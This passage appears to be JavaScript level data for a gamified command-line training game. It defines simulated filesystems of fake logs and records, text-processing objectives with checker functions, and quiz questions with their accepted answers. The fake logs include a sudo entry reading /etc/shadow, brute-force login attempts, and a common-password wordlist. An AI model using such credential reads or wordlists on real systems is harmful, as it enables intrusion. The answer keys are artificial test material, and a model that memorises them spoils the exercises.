                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['access.log', 'users.db', 'network.log', 'auth.log', 'captured.pcap.txt']
                },
                '/home/operator/intel/access.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 892,
                    content: `192.168.1.105 - - [15/Jan/2024:10:15:32] "GET /admin/login.php" 200
192.168.1.42 - - [15/Jan/2024:10:16:01] "GET /index.html" 200
10.0.0.88 - - [15/Jan/2024:10:16:45] "POST /api/upload" 403
192.168.1.105 - - [15/Jan/2024:10:17:22] "GET /admin/config.php" 200
192.168.1.42 - - [15/Jan/2024:10:18:03] "GET /images/logo.png" 200
10.0.0.88 - - [15/Jan/2024:10:18:55] "POST /api/upload" 403
192.168.1.105 - - [15/Jan/2024:10:19:12] "GET /admin/users.php" 200
172.16.0.23 - - [15/Jan/2024:10:20:01] "GET /robots.txt" 200
192.168.1.105 - - [15/Jan/2024:10:21:33] "POST /admin/export" 200
10.0.0.88 - - [15/Jan/2024:10:22:15] "POST /api/upload" 403
192.168.1.42 - - [15/Jan/2024:10:23:44] "GET /contact.html" 200
192.168.1.105 - - [15/Jan/2024:10:24:08] "GET /admin/logs.php" 200`
                },
                '/home/operator/intel/users.db': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 412,
                    content: `admin:x:1000:1000:System Admin:/home/admin:/bin/bash
jsmith:x:1001:1001:John Smith:/home/jsmith:/bin/bash
operator:x:1002:1002:Field Operator:/home/operator:/bin/bash
analyst:x:1003:1003:Data Analyst:/home/analyst:/bin/bash
guest:x:1004:1004:Guest User:/home/guest:/bin/false
backup:x:1005:1005:Backup Service:/var/backup:/bin/false
monitor:x:1006:1006:Monitor Daemon:/var/monitor:/bin/false`
                },
                '/home/operator/intel/network.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 298,
                    content: `TCP 192.168.1.105:44821 -> 10.0.0.5:443 ESTABLISHED
TCP 192.168.1.42:55123 -> 10.0.0.5:80 ESTABLISHED
UDP 10.0.0.88:53421 -> 8.8.8.8:53 DNS_QUERY
TCP 192.168.1.105:44822 -> 10.0.0.5:22 ESTABLISHED
TCP 172.16.0.23:61234 -> 10.0.0.5:80 TIME_WAIT
TCP 10.0.0.88:48372 -> 10.0.0.5:443 SYN_SENT
TCP 10.0.0.88:48373 -> 10.0.0.5:443 SYN_SENT
UDP 192.168.1.105:55000 -> 10.0.0.1:53 DNS_QUERY`
                },
                '/home/operator/intel/auth.log': {
                    type: 'file',
                    perms: '-rw-r-----',
                    owner: 'root',
                    group: 'adm',
                    size: 1024,
                    content: `Jan 15 09:45:12 shadow sshd[2341]: Accepted publickey for operator from 192.168.1.105 port 52413
Jan 15 09:52:33 shadow sshd[2456]: Failed password for admin from 10.0.0.88 port 44123
Jan 15 09:52:35 shadow sshd[2456]: Failed password for admin from 10.0.0.88 port 44123
Jan 15 09:52:38 shadow sshd[2456]: Failed password for admin from 10.0.0.88 port 44123
Jan 15 09:52:41 shadow sshd[2456]: Connection closed by 10.0.0.88 port 44123 [preauth]
Jan 15 10:01:22 shadow sudo: operator : TTY=pts/0 ; PWD=/home/operator ; USER=root ; COMMAND=/bin/cat /etc/shadow
Jan 15 10:15:00 shadow sshd[2512]: Accepted password for jsmith from 192.168.1.42 port 55612
Jan 15 10:22:18 shadow sshd[2534]: Invalid user scanner from 10.0.0.88 port 44200
Jan 15 10:22:19 shadow sshd[2534]: Failed password for invalid user scanner from 10.0.0.88 port 44200`
                },
                '/home/operator/intel/captured.pcap.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 645,
                    content: `# Packet capture summary - extracted from wireshark
# Source: 10.0.0.88 (Threat Actor)
Frame 1: 10.0.0.88 -> 10.0.0.5 TCP SYN port 443
Frame 2: 10.0.0.5 -> 10.0.0.88 TCP SYN-ACK
Frame 3: 10.0.0.88 -> 10.0.0.5 TCP ACK
Frame 4: 10.0.0.88 -> 10.0.0.5 HTTP POST /api/upload
Frame 5: 10.0.0.5 -> 10.0.0.88 HTTP 403 Forbidden
Frame 6: 10.0.0.88 -> 10.0.0.5 TCP FIN
# Pattern: Automated upload attempts every 2 minutes
# Recommendation: Block 10.0.0.88 at firewall`
                },
                // === LOGS DIRECTORY ===
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['app.log', 'error.log', 'cron.log', 'firewall.log']
                },
                '/home/operator/logs/app.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 512,
                    content: `2024-01-15 10:00:01 INFO  Application started
2024-01-15 10:00:02 INFO  Database connection established
2024-01-15 10:15:32 INFO  User login: admin from 192.168.1.105
2024-01-15 10:16:45 WARN  Upload rejected: unauthorized IP 10.0.0.88
2024-01-15 10:18:55 WARN  Upload rejected: unauthorized IP 10.0.0.88
2024-01-15 10:20:01 INFO  Robots.txt served to 172.16.0.23
2024-01-15 10:22:15 WARN  Upload rejected: unauthorized IP 10.0.0.88
2024-01-15 10:30:00 INFO  Scheduled backup started
2024-01-15 10:30:45 INFO  Backup completed: 2.3GB`
                },
                '/home/operator/logs/error.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `[ERROR] 2024-01-15 10:16:45 - AuthModule: IP not in whitelist: 10.0.0.88
[ERROR] 2024-01-15 10:18:55 - AuthModule: IP not in whitelist: 10.0.0.88
[ERROR] 2024-01-15 10:22:15 - AuthModule: IP not in whitelist: 10.0.0.88
[ERROR] 2024-01-15 10:25:33 - DBModule: Query timeout after 30s
[WARN]  2024-01-15 10:26:00 - DBModule: Reconnecting to database
[ERROR] 2024-01-15 10:45:12 - FileModule: Disk space below 10%`
                },
                '/home/operator/logs/cron.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `Jan 15 00:00:01 CRON[1001]: (root) CMD (/usr/bin/log-rotate)
Jan 15 00:05:00 CRON[1023]: (backup) CMD (/opt/backup/daily.sh)
Jan 15 06:00:00 CRON[1156]: (root) CMD (/usr/bin/apt-daily)
Jan 15 10:30:00 CRON[1289]: (operator) CMD (/home/operator/scripts/monitor.sh)`
                },
                '/home/operator/logs/firewall.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 720,
                    content: `Jan 15 10:16:44 BLOCK IN=eth0 SRC=10.0.0.88 DST=10.0.0.5 PROTO=TCP DPT=22
Jan 15 10:18:54 BLOCK IN=eth0 SRC=10.0.0.88 DST=10.0.0.5 PROTO=TCP DPT=22
Jan 15 10:22:14 BLOCK IN=eth0 SRC=10.0.0.88 DST=10.0.0.5 PROTO=TCP DPT=22
Jan 15 10:25:00 ALLOW IN=eth0 SRC=192.168.1.105 DST=10.0.0.5 PROTO=TCP DPT=443
Jan 15 10:26:12 ALLOW IN=eth0 SRC=192.168.1.42 DST=10.0.0.5 PROTO=TCP DPT=80
Jan 15 10:30:00 BLOCK IN=eth0 SRC=10.0.0.88 DST=10.0.0.5 PROTO=TCP DPT=3306
Jan 15 10:45:00 BLOCK IN=eth0 SRC=10.0.0.88 DST=10.0.0.5 PROTO=TCP DPT=5432`
                },
                // === DATA DIRECTORY ===
                '/home/operator/data': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['employees.csv', 'servers.csv', 'ports.txt', 'ips_whitelist.txt']
                },
                '/home/operator/data/employees.csv': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 320,
                    content: `id,name,department,clearance,email
1001,John Smith,Engineering,3,jsmith@shadow.local
1002,Sarah Chen,Security,5,schen@shadow.local
1003,Mike Johnson,Operations,2,mjohnson@shadow.local
1004,Emily Brown,Research,4,ebrown@shadow.local
1005,David Wilson,IT,3,dwilson@shadow.local
1006,Lisa Anderson,Admin,1,landerson@shadow.local`
                },
                '/home/operator/data/servers.csv': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 280,
                    content: `hostname,ip,role,status,os
web01,10.0.0.5,webserver,active,ubuntu
db01,10.0.0.10,database,active,debian
app01,10.0.0.15,application,active,centos
backup01,10.0.0.20,backup,active,ubuntu
monitor01,10.0.0.25,monitoring,maintenance,debian`
                },
                '/home/operator/data/ports.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 180,
                    content: `22 SSH
80 HTTP
443 HTTPS
3306 MySQL
5432 PostgreSQL
6379 Redis
8080 HTTP-Alt
27017 MongoDB`
                },
                '/home/operator/data/ips_whitelist.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 120,
                    content: `# Authorized IPs
192.168.1.0/24  # Internal network
172.16.0.0/16   # VPN range
10.0.0.1        # Gateway
# NOTE: 10.0.0.88 is NOT authorized`
                },
                // === SCRIPTS DIRECTORY ===
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['monitor.sh', 'analyze_logs.sh', 'extract_ips.sh']
                },
                '/home/operator/scripts/monitor.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `#!/bin/bash
# System monitoring script
echo "=== System Status ==="
uptime
echo ""
echo "=== Disk Usage ==="
df -h
echo ""
echo "=== Active Connections ==="
netstat -tulpn | head -10`
                },
                '/home/operator/scripts/analyze_logs.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `#!/bin/bash
# Log analysis script
# Usage: ./analyze_logs.sh <logfile>

LOGFILE=\${1:-intel/access.log}

echo "=== Top 5 IPs by Request Count ==="
cut -d ' ' -f 1 "$LOGFILE" | sort | uniq -c | sort -rn | head -5

echo ""
echo "=== HTTP Status Codes ==="
awk '{print $9}' "$LOGFILE" | sort | uniq -c | sort -rn`
                },
                '/home/operator/scripts/extract_ips.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 180,
                    content: `#!/bin/bash
# Extract unique IPs from a log file
# Usage: ./extract_ips.sh <logfile>

grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' "\${1:-/dev/stdin}" | sort -u`
                },
                // === REPORTS DIRECTORY ===
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['README.txt', 'threat_brief.txt']
                },
                '/home/operator/reports/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 156,
                    content: `# Analysis Reports Directory
Save your processed output here.

Example:
  cut -d ' ' -f 1 intel/access.log | sort | uniq -c > reports/ip_counts.txt`
                },
                '/home/operator/reports/threat_brief.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 420,
                    content: `THREAT INTELLIGENCE BRIEF
Date: 2024-01-15
Classification: INTERNAL

SUMMARY:
Suspicious activity detected from external IP.
Multiple unauthorized access attempts to /api/upload endpoint.

ACTION ITEMS:
[ ] Identify threat actor IP using log analysis
[ ] Correlate with auth.log for SSH attempts
[ ] Check firewall logs for blocked connections
[ ] Generate report of all 403 responses`
                },
                // === HIDDEN CONFIG ===
                '/home/operator/.config': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['aliases.conf', 'tools.conf']
                },
                '/home/operator/.config/aliases.conf': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 180,
                    content: `# Custom aliases
alias ll='ls -la'
alias grep='grep --color=auto'
alias ipcount='cut -d " " -f 1 | sort | uniq -c | sort -rn'
alias top10='head -10'`
                },
                '/home/operator/.config/tools.conf': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 120,
                    content: `# Tool configurations
EDITOR=vim
PAGER=less
LOG_DIR=/home/operator/logs
REPORT_DIR=/home/operator/reports`
                },
                // === HIDDEN NOTES ===
                '/home/operator/.notes': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 280,
                    content: `Personal investigation notes:

That IP 10.0.0.88 keeps hitting us. Three failed SSH logins,
then switched to the API. Classic pivot behavior.

Check patterns:
- grep "10.0.0.88" intel/*.log
- cut + sort + uniq to see frequency

This might be automated. Check timing intervals.`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `ls -la
cd intel
cat access.log
grep 403 access.log
cut -d ' ' -f 1 access.log | sort | uniq -c
cat ../reports/threat_brief.txt
ls -la /home/operator/.config/`
                },
                '/home/operator/.text_processing_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 1024,
                    content: `TEXT PROCESSING - OPERATOR CHEATSHEET
=======================================

CUT - Extract columns/fields
  cut -d ' ' -f 1 file      Field 1, space delimiter
  cut -d ',' -f 2,3 file    Fields 2 and 3, comma delim
  cut -c 1-10 file          Characters 1-10

SORT - Order lines
  sort file                 Alphabetical sort
  sort -n file              Numeric sort
  sort -r file              Reverse sort
  sort -k2 file             Sort by column 2
  sort -t ',' -k3 file      Sort by field 3, comma delim

UNIQ - Deduplicate (requires sorted input)
  uniq file                 Remove duplicates
  uniq -c file              Count occurrences
  uniq -d file              Show only duplicates
  sort file | uniq -c       Common pattern

AWK - Field processing
  awk '{print $1}' file         First field
  awk -F: '{print $1}' file     First field, colon delim
  awk '{print $1, $3}' file     Multiple fields
  awk '/pattern/' file          Filter lines

SED - Stream editing
  sed 's/old/new/' file         Replace first match
  sed 's/old/new/g' file        Replace all matches
  sed '/pattern/d' file         Delete matching lines
  sed -n '1,10p' file           Print lines 1-10

COMMON PIPELINES
  cut -d ' ' -f 1 file | sort | uniq -c | sort -rn
  grep pattern file | awk '{print $2}' | sort -u
  sed 's/secret/[REDACTED]/g' file > sanitized.txt

"Transform data. Extract intelligence."
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'EXTRACT: Cut IP Addresses',
                    hint: 'Use cut to extract IPs: cut -d \' \' -f 1 intel/access.log',
                    check: (cmd, state, output) => cmd.includes('cut') && cmd.includes('-d') && cmd.includes('-f') &&
                               (cmd.includes('1') || cmd.includes('access')) &&
                               output && !output.startsWith('cut:')
                },
                {
                    id: 2,
                    task: 'ORGANIZE: Sort the Log Entries',
                    hint: 'Sort the log: sort intel/access.log',
                    check: (cmd, state, output) => cmd.includes('sort') && cmd.includes('access') &&
                               output && !output.startsWith('sort:')
                },
                {
                    id: 3,
                    task: 'ANALYZE: Count Unique IPs',
                    hint: 'Pipe commands: cut -d \' \' -f 1 intel/access.log | sort | uniq -c',
                    check: (cmd, state, output) => cmd.includes('uniq') && (cmd.includes('-c') || cmd.includes('sort')) &&
                               output && !output.startsWith('uniq:')
                },
                {
                    id: 4,
                    task: 'PARSE: Extract Usernames with AWK',
                    hint: 'Use awk: awk -F: \'{print $1}\' intel/users.db',
                    check: (cmd, state, output) => cmd.includes('awk') && (cmd.includes('print') || cmd.includes('users')) &&
                               output && !output.startsWith('awk:')
                },
                {
                    id: 5,
                    task: 'SANITIZE: Redact IPs with SED',
                    hint: 'sed \'s/10.0.0.88/[REDACTED]/g\' intel/access.log',
                    check: (cmd, state, output) => cmd.includes('sed') && cmd.includes('s/') &&
                               (cmd.includes('REDACTED') || cmd.includes('access')) &&
                               output && !output.startsWith('sed:')
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "Based on your analysis, which IP is making unauthorized upload attempts?",
                acceptedAnswers: [
                    "10.0.0.88",
                    "10.0.0.88."
                ],
                hint: "Look for repeated 403 (forbidden) responses in the access log.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "IP not confirmed. Analyze the access.log for repeated 403 errors.",
                correctAnswerMessage: "Threat actor identified: 10.0.0.88 - Flagged for monitoring."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-010: I/O Redirection
        // Theme: Data stream control and redirection
        // ──────────────────────────────────────────────────────────
        'CLH-010': {
            title: 'I/O Redirection',
            description: 'Master output redirection, pipes, and data stream control.',
            prerequisites: ['CLH-009'],
            tier: 'CLI Operative',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['intel', 'reports', 'logs', 'data', '.bash_history', '.redirect_cheatsheet']
                },
                // === INTEL DIRECTORY ===
                '/home/operator/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['access.log', 'targets.txt', 'notes.txt', 'connections.log', 'errors.log']
                },
                '/home/operator/intel/access.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 720,
                    content: `192.168.1.105 - - [15/Jan/2024:10:15:32] "GET /admin/login.php" 200
192.168.1.42 - - [15/Jan/2024:10:16:01] "GET /index.html" 200
10.0.0.88 - - [15/Jan/2024:10:16:45] "POST /api/upload" 403
192.168.1.105 - - [15/Jan/2024:10:17:22] "GET /admin/config.php" 200
192.168.1.42 - - [15/Jan/2024:10:18:03] "GET /images/logo.png" 200
10.0.0.88 - - [15/Jan/2024:10:18:55] "POST /api/upload" 403
192.168.1.105 - - [15/Jan/2024:10:19:12] "GET /admin/users.php" 200
172.16.0.23 - - [15/Jan/2024:10:20:01] "GET /robots.txt" 200
192.168.1.105 - - [15/Jan/2024:10:21:33] "POST /admin/export" 200
10.0.0.88 - - [15/Jan/2024:10:22:15] "POST /api/upload" 403`
                },
                '/home/operator/intel/targets.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 156,
                    content: `192.168.1.105 - Primary target
192.168.1.42 - Secondary target
10.0.0.88 - Unknown actor
172.16.0.23 - Reconnaissance probe`
                },
                '/home/operator/intel/notes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: `Analyst notes: Monitor 192.168.1.105 for persistence
Priority: HIGH
Last updated: 2024-01-15 10:30 UTC`
                },
                '/home/operator/intel/connections.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 320,
                    content: `TCP 192.168.1.105:44821 -> 10.0.0.5:443 ESTABLISHED
TCP 192.168.1.42:55123 -> 10.0.0.5:80 ESTABLISHED
UDP 10.0.0.88:53421 -> 8.8.8.8:53 DNS_QUERY
TCP 192.168.1.105:44822 -> 10.0.0.5:22 SSH
TCP 172.16.0.23:61234 -> 10.0.0.5:80 TIME_WAIT
TCP 10.0.0.88:48372 -> 10.0.0.5:443 REJECTED`
                },
                '/home/operator/intel/errors.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `[ERROR] 10:16:45 Auth failed: 10.0.0.88
[ERROR] 10:18:55 Auth failed: 10.0.0.88
[WARN]  10:20:01 Suspicious scan: 172.16.0.23
[ERROR] 10:22:15 Auth failed: 10.0.0.88
[INFO]  10:25:00 Backup completed successfully`
                },
                // === LOGS DIRECTORY ===
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['system.log', 'auth.log']
                },
                '/home/operator/logs/system.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `Jan 15 10:00:00 shadow systemd[1]: Started Daily apt activities.
Jan 15 10:15:00 shadow kernel: eth0: link up 1000Mbps
Jan 15 10:30:00 shadow cron[1234]: (operator) CMD (backup.sh)
Jan 15 10:45:00 shadow systemd[1]: Starting log rotation...
Jan 15 11:00:00 shadow systemd[1]: Finished log rotation.`
                },
                '/home/operator/logs/auth.log': {
                    type: 'file',
                    perms: '-rw-r-----',
                    owner: 'root',
                    group: 'adm',
                    size: 512,
                    content: `Jan 15 09:45:12 shadow sshd[2341]: Accepted key for operator from 192.168.1.105
Jan 15 09:52:33 shadow sshd[2456]: Failed password for admin from 10.0.0.88
Jan 15 09:52:35 shadow sshd[2456]: Failed password for admin from 10.0.0.88
Jan 15 10:01:22 shadow sudo: operator : TTY=pts/0 ; USER=root ; COMMAND=/bin/cat
Jan 15 10:15:00 shadow sshd[2512]: Accepted password for jsmith from 192.168.1.42`
                },
                // === DATA DIRECTORY ===
                '/home/operator/data': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['wordlist.txt', 'ips.txt']
                },
                '/home/operator/data/wordlist.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 64,
                    content: `admin
password
root
user
guest
test
backup`
                },
                '/home/operator/data/ips.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 80,
                    content: `192.168.1.105
192.168.1.42
10.0.0.88
172.16.0.23
10.0.0.5`
                },
                // === REPORTS DIRECTORY ===
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['mission.log', 'README.txt']
                },
                '/home/operator/reports/mission.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: `=== MISSION LOG ===
Mission: Stream Control Training
Status: In Progress
Objective: Master I/O redirection
`
                },
                '/home/operator/reports/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `# Reports Directory

Use this directory to save your analysis output.

Redirect examples:
  command > file.txt    # Write output to file (overwrite)
  command >> file.txt   # Append output to file
  command | tee file    # Output to screen AND file`
                },
                // === HIDDEN FILES ===
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 180,
                    content: `ls -la
cat intel/access.log
grep 403 intel/access.log
ls intel > reports/inventory.txt
date >> reports/mission.log
cat intel/notes.txt`
                },
                '/home/operator/.redirect_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 420,
                    content: `=== I/O REDIRECTION CHEATSHEET ===

STDOUT (Standard Output):
  >   Redirect output (overwrite)
  >>  Redirect output (append)
  |   Pipe to another command

STDIN (Standard Input):
  <   Read input from file

STDERR (Standard Error):
  2>  Redirect errors
  2>&1  Redirect errors to stdout

TEE (Split stream):
  cmd | tee file    # Screen AND file
  cmd | tee -a file # Append mode`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'CAPTURE: Redirect Output to File',
                    hint: 'ls intel > reports/filelist.txt',
                    check: (cmd, state, output) => {
                        return cmd.includes('>') && !cmd.includes('>>') && cmd.includes('reports') &&
                               output && output.includes('Redirected');
                    }
                },
                {
                    id: 2,
                    task: 'APPEND: Add Timestamp to Log',
                    hint: 'date >> reports/mission.log',
                    check: (cmd, state, output) => cmd.includes('>>') && cmd.includes('mission.log') &&
                               output && output.includes('Redirected')
                },
                {
                    id: 3,
                    task: 'PIPELINE: Filter and Count',
                    hint: 'grep "192.168" intel/access.log | wc -l',
                    check: (cmd, state, output) => cmd.includes('|') && cmd.includes('grep') &&
                               cmd.includes('wc') && output && /^\s*\d+/.test(output)
                },
                {
                    id: 4,
                    task: 'CHAIN: Multi-Stage Pipeline',
                    hint: 'cut -d \' \' -f 1 intel/access.log | sort | uniq -c',
                    check: (cmd, state, output) => {
                        const pipeCount = (cmd.match(/\|/g) || []).length;
                        return pipeCount >= 2 && cmd.includes('uniq') && output && output.includes('192');
                    }
                },
                {
                    id: 5,
                    task: 'TEE: Split the Stream',
                    hint: 'ls -la intel | tee reports/inventory.txt',
                    check: (cmd, state, output) => cmd.includes('tee') && cmd.includes('reports') &&
                               output && !output.startsWith('tee:')
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "According to the analyst notes, which IP should be monitored for persistence?",
                acceptedAnswers: [
                    "192.168.1.105",
                    "192.168.1.105."
                ],
                hint: "Check the intel directory for analyst notes about monitoring targets.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Target IP not confirmed. Review the analyst notes in intel/.",
                correctAnswerMessage: "Target confirmed: 192.168.1.105 - Added to persistence watchlist."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-011: Advanced Grep
        // Theme: Pattern matching and regex mastery
        // ──────────────────────────────────────────────────────────
        'CLH-011': {
            title: 'Advanced Grep',
            description: 'Master grep options and regular expressions for pattern hunting.',
            prerequisites: ['CLH-010'],
            tier: 'CLI Operative',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['logs', 'reports', 'data', '.bash_history', '.grep_cheatsheet']
                },
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['system.log', 'auth.log', 'network.log', 'access.log', 'error.log']
                },
                '/home/operator/logs/system.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 678,
                    content: `Jan 15 10:15:32 shadow kernel: [INFO] System started
Jan 15 10:15:33 shadow systemd: [INFO] Network service started
Jan 15 10:16:01 shadow kernel: [ERROR] Disk I/O timeout on /dev/sdb
Jan 15 10:16:45 shadow cron: [INFO] Scheduled task executed
Jan 15 10:17:22 shadow kernel: [Warning] High memory usage detected
Jan 15 10:18:03 shadow systemd: [INFO] Service httpd restarted
Jan 15 10:18:55 shadow kernel: [ERROR] Buffer overflow in module xyz
Jan 15 10:19:12 shadow sshd: [INFO] Connection from 192.168.1.105
Jan 15 10:20:01 shadow kernel: [error] Failed to allocate memory
Jan 15 10:21:33 shadow systemd: [INFO] Backup completed
Jan 15 10:22:15 shadow kernel: [ERROR] Watchdog timeout - system unstable`
                },
                '/home/operator/logs/auth.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 612,
                    content: `Jan 15 10:15:32 shadow sshd[1234]: FAILED login for admin from 10.0.0.88
Jan 15 10:15:45 shadow sshd[1234]: FAILED login for admin from 10.0.0.88
Jan 15 10:16:01 shadow sshd[1235]: success login for operator from 192.168.1.42
Jan 15 10:16:22 shadow sshd[1234]: FAILED login for root from 10.0.0.88
Jan 15 10:17:03 shadow sshd[1236]: success login for analyst from 192.168.1.105
Jan 15 10:17:45 shadow sshd[1234]: FAILED login for admin from 10.0.0.88
Jan 15 10:18:12 shadow sshd[1237]: success login for backup from localhost
Jan 15 10:18:55 shadow sshd[1234]: FAILED login for root from 10.0.0.88
Jan 15 10:19:33 shadow sshd[1234]: FAILED login for test from 10.0.0.88
Jan 15 10:20:15 shadow sshd[1238]: success login for monitor from 172.16.0.23`
                },
                '/home/operator/logs/network.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 456,
                    content: `10:15:32 TCP 192.168.1.105:44821 -> 10.0.0.5:443 ESTABLISHED
10:15:45 TCP 192.168.1.42:55123 -> 10.0.0.5:80 ESTABLISHED
10:16:01 UDP 10.0.0.88:53421 -> 8.8.8.8:53 DNS_QUERY
10:16:22 TCP 192.168.1.105:44822 -> 10.0.0.5:22 ESTABLISHED
10:17:03 TCP 172.16.0.23:61234 -> 10.0.0.5:80 TIME_WAIT
10:17:45 ICMP 10.0.0.88 -> 192.168.1.1 ECHO_REQUEST
10:18:12 TCP 192.168.1.105:44823 -> 10.0.0.5:3306 ESTABLISHED
10:18:55 UDP 192.168.1.42:12345 -> 10.0.0.5:161 SNMP
10:19:33 TCP 10.0.0.88:55555 -> 192.168.1.1:445 SYN_SENT
10:20:15 TCP 172.16.0.23:61235 -> 10.0.0.5:443 ESTABLISHED`
                },
                '/home/operator/logs/access.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 892,
                    content: `192.168.1.105 - - [15/Jan/2024:10:15:32] "GET /admin/login.php" 200 1234
10.0.0.88 - - [15/Jan/2024:10:15:45] "POST /admin/login.php" 401 567
192.168.1.42 - - [15/Jan/2024:10:16:01] "GET /index.html" 200 8901
10.0.0.88 - - [15/Jan/2024:10:16:22] "POST /admin/login.php" 401 567
192.168.1.105 - - [15/Jan/2024:10:17:03] "GET /api/users" 200 2345
10.0.0.88 - - [15/Jan/2024:10:17:45] "POST /admin/login.php" 401 567
172.16.0.23 - - [15/Jan/2024:10:18:12] "GET /dashboard" 200 4567
10.0.0.88 - - [15/Jan/2024:10:18:55] "GET /robots.txt" 200 123
